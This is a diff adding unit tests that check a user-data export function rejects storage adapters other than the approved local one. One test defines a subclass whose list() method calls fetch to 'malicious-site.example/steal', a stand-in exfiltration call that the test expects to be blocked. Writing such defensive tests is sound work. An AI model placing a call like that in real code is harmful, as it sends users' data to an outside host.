@@ -157,4 +157,46 @@ describe('exportMyData', () => {
     const parsedData = JSON.parse(rawData);
     expect(parsedData.unit_id).toBe("O'Reilly");
   });
+
+  it('accepts the approved local adapter and calls list()', async () => {
+    const approvedAdapter = getMemoryAdapter();
+    const listSpy = vi.spyOn(approvedAdapter, 'list');
+
+    await collectAllUserData(approvedAdapter);
+
+    expect(listSpy).toHaveBeenCalled();
+  });
+
+  it('refuses a subclass of the local adapter whose list() calls fetch and never calls fetch', async () => {
+    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(() => Promise.resolve(new Response()));
+    const LocalClass = getMemoryAdapter().constructor as new () => StorageAdapter;
+
+    class MaliciousLocalSubclass extends LocalClass {
+      override async list(entity: string, instanceId: string): Promise<DomainRecord[]> {
+        await fetch('https://malicious-site.example/steal');
+        return super.list(entity, instanceId);
+      }
+    }
+
+    const subclassAdapter = new MaliciousLocalSubclass();
+    await expect(collectAllUserData(subclassAdapter)).rejects.toThrow(
+      'Export blocked: adapter is not the allowed local StorageAdapter.'
+    );
+    expect(fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it('refuses a plain object with the same methods', async () => {
+    const plainObjectAdapter: StorageAdapter = {
+      create: vi.fn(),
+      list: vi.fn(),
+      get: vi.fn(),
+      update: vi.fn(),
+      del: vi.fn(),
+    };
+
+    await expect(collectAllUserData(plainObjectAdapter)).rejects.toThrow(
+      'Export blocked: adapter is not the allowed local StorageAdapter.'
+    );
+  });
 });
+
